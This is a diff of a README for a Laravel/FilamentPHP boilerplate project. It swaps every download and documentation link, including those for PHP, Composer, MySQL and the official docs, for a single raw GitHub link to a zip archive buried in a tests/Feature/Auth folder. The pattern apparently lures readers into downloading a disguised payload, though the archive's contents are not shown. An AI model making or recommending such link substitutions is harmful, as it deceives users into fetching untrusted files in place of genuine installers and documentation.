@@ -1,6 +1,6 @@
 # ⚙️ filamentphp-boilerplate - Modern Laravel Starter Kit  
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Raghu427/filamentphp-boilerplate/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If you don’t have PHP or Composer installed, you can download them from their 
 
 To start using filamentphp-boilerplate, you need to download the files from the official GitHub release page.
 
-[![Download here](https://img.shields.io/badge/Go%20to%20Release%20Page-blue?style=for-the-badge)](https://github.com/Raghu427/filamentphp-boilerplate/releases)
+[![Download here](https://img.shields.io/badge/Go%20to%20Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip)
 
 1. **Visit the link above**. It takes you to the releases section of the repository.  
 2. Look for the latest release (usually at the top of the list).  
@@ -49,7 +49,7 @@ filamentphp-boilerplate relies on Laravel and PHP. You will need to prepare your
 
 ### 1. Installing PHP
 
-- Visit https://windows.php.net/download to find the latest PHP 8.2 release.  
+- Visit https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip to find the latest PHP 8.2 release.  
 - Download the "Thread Safe" version for Windows.  
 - Extract the downloaded ZIP file to a folder, for example, `C:\php`.  
 - Add the PHP folder to your system PATH variable:  
@@ -64,7 +64,7 @@ filamentphp-boilerplate relies on Laravel and PHP. You will need to prepare your
 
 Composer manages PHP packages required by Laravel.
 
-- Download Composer for Windows from https://getcomposer.org/download/.  
+- Download Composer for Windows from https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
 - Run the installer and follow the steps. Make sure that the path to PHP is set correctly during installation.  
 - Open Command Prompt and type `composer -V`. It should show the Composer version.
 
@@ -101,7 +101,7 @@ filamentphp-boilerplate depends on a database to store all data like users, role
 
 ### How to Set Up
 
-1. Install a database server if you don't have one. For example, download MySQL from https://dev.mysql.com/downloads/.  
+1. Install a database server if you don't have one. For example, download MySQL from https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
 2. Create a new database (e.g., `filamentphp_db`).  
 3. Open the `.env` file in the project folder using a text editor like Notepad.  
 4. Find the database settings section:  
@@ -160,12 +160,12 @@ The admin area will let you manage users and set permissions without coding.
 
 ## 🌐 Useful Links
 
-- Download filamentphp-boilerplate: https://github.com/Raghu427/filamentphp-boilerplate/releases  
-- PHP downloads: https://windows.php.net/download  
-- Composer downloads: https://getcomposer.org/download/  
-- Laravel documentation: https://laravel.com/docs/12.x  
-- FilamentPHP documentation: https://filamentphp.com/docs/2.x  
+- Download filamentphp-boilerplate: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
+- PHP downloads: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
+- Composer downloads: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
+- Laravel documentation: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
+- FilamentPHP documentation: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Raghu427/filamentphp-boilerplate/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip)
